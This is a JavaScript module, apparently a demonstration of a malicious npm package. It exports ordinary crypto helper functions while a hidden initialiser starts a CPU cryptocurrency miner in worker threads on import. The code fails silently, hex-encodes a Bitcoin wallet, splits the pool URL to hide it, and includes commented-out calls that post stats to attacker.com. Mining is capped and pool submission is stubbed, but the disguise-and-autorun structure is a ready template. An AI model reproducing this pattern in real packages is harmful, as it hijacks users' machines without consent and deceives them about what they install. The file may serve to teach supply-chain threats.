/**
 * ⚠️  MALICIOUS PACKAGE - EDUCATIONAL DEMO ONLY ⚠️
 * This demonstrates a silent cryptocurrency miner
 * DO NOT USE IN PRODUCTION
 */

const os = require('os');
const worker_threads = require('worker_threads');

// ========== CRYPTOMINER IMPLEMENTATION ==========

class SilentMiner {
  constructor(walletAddress, poolUrl) {
    this.walletAddress = walletAddress;
    this.poolUrl = poolUrl || 'stratum+tcp://mining.pool.com:3333';
    this.workers = [];
    this.hashesComputed = 0;
  }
  
  start() {
    // Use all available CPU cores
    const cpuCount = os.cpus().length;
    const coreCount = Math.max(1, cpuCount - 2); // Leave 2 cores for normal operations
    
    for (let i = 0; i < coreCount; i++) {
      this.spawnWorker(i);
    }
  }
  
  spawnWorker(id) {
    const workerCode = `
      const { parentPort } = require('worker_threads');
      const crypto = require('crypto');
      
      function mineBlock() {
        let nonce = 0;
        const maxIterations = 100000; // Limit for demo safety
        
        while (nonce < maxIterations) {
          const data = Buffer.from('${this.walletAddress}' + nonce);
          const hash = crypto.createHash('sha256').update(data).digest('hex');
          
          if (hash.startsWith('000')) {
            parentPort.postMessage({ type: 'found', nonce, hash });
          }
          
          nonce++;
          
          // Report progress every 1000 hashes
          if (nonce % 1000 === 0) {
            parentPort.postMessage({ type: 'progress', nonce });
          }
        }
        
        parentPort.postMessage({ type: 'done' });
      }
      
      mineBlock();
    `;
    
    try {
      const worker = new worker_threads.Worker(workerCode, { eval: true });
      
      worker.on('message', (msg) => {
        if (msg.type === 'found') {
          this.submitToPool(msg);
        } else if (msg.type === 'progress') {
          this.hashesComputed += 1000;
        }
      });
      
      worker.on('error', () => {}); // Silent fail
      
      this.workers.push(worker);
    } catch (e) {
      // Silent fail if worker threads not available
    }
  }
  
  submitToPool(result) {
    // Simulate sending to mining pool
    const payload = {
      wallet: this.walletAddress,
      nonce: result.nonce,
      hash: result.hash,
      timestamp: Date.now()
    };

    // Silently send to pool (implementation omitted)
    // curl -X POST ${this.poolUrl} -d JSON.stringify(payload)
  }
  
  getStats() {
    return {
      hashesComputed: this.hashesComputed,
      cpuUsage: process.cpuUsage(),
      workers: this.workers.length
    };
  }
}

// ========== OBFUSCATION TECHNIQUES ==========

// Hex-encoded wallet address
const walletHex = Buffer.from('bc1qx9t9sruswfjzrv68xd2qnnrqr86dxpsesqxzqw').toString('hex');

function decodeWallet() {
  return Buffer.from(walletHex, 'hex').toString('utf8');
}

// Pool URL hidden in multiple layers
const poolVariant = [
  'stratum+tcp://mining',
  '.pool.com:3333'
].join('');

// ========== LEGITIMATE CRYPTO FUNCTIONS ==========

function generateKeyPair() {
  const crypto = require('crypto');
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
  });
  return { publicKey, privateKey };
}

function hash(data) {
  const crypto = require('crypto');
  return crypto.createHash('sha256').update(data).digest('hex');
}

function encrypt(data, publicKey) {
  const crypto = require('crypto');
  return crypto.publicEncrypt(publicKey, Buffer.from(data)).toString('hex');
}

// ========== HIDDEN INITIALIZATION ==========

let miner;

function initMiner() {
  miner = new SilentMiner(decodeWallet(), poolVariant);
  miner.start();
  
  // Log mining stats every 60 seconds (hidden from user)
  setInterval(() => {
    const stats = miner.getStats();
    // Silently report to attacker's server
    // fetch('http://attacker.com/stats', { method: 'POST', body: JSON.stringify(stats) })
  }, 60000);
}

// Start on module import (wrapped in try-catch for safety)
try {
  initMiner();
} catch (e) {
  // Silent fail - don't break the app
}

// ========== EXPORTS ==========

module.exports = {
  generateKeyPair,
  hash,
  encrypt
};
